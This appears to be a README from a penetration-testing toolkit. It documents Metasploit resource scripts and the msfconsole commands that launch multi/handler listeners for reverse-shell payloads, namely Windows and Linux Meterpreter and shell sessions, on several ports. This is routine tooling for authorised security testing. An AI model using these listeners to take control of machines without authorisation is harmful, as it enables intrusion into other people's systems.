# Resource Scripts (.rc)

This directory contains Metasploit Resource Scripts (`.rc` files) designed to automate repetitive tasks within `msfconsole`.

## 1. Simple Listener (`multi_handler_listener.rc`)

This script is for quickly starting a generic listener with a default configuration. It's best for scenarios where you commonly use a Windows Meterpreter payload.

**Content:**

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j


**How to Use:**
Run directly from your terminal. `msfconsole` will start and immediately execute the script.
```bash
msfconsole -r resource_scripts/multi_handler_listener.rc
```

## 2. Flexible Listener (flexible_listener.rc)
This is a more advanced, reusable script that starts a listener using variables you provide from the command line. The script itself does not contain any hardcoded payload, host, or port, making it truly flexible.

**Content:**

use exploit/multi/handler
exploit -j
jobs
How to Use:
The key is to use the -x flag with msfconsole to pass commands that set the PAYLOAD, LHOST, and LPORT variables before the resource command loads the script.

Example 1: Starting a Windows x64 Meterpreter Listener
```bash
msfconsole -x "set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; resource resource_scripts/flexible_listener.rc"
```
Example 2: Starting a Linux Shell Listener on a different port
```bash
msfconsole -x "set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST eth0; set LPORT 8080; resource resource_scripts/flexible_listener.rc"
```
Example 3: Starting a Python Meterpreter Listener
```bash
msfconsole -x "set PAYLOAD python/meterpreter_reverse_http; set LHOST 10.10.10.1; set LPORT 80; resource resource_scripts/flexible_listener.rc"
By using this flexible script, you avoid creating dozens of different .rc files for each payload you might need.
```
<-- Back to Main README
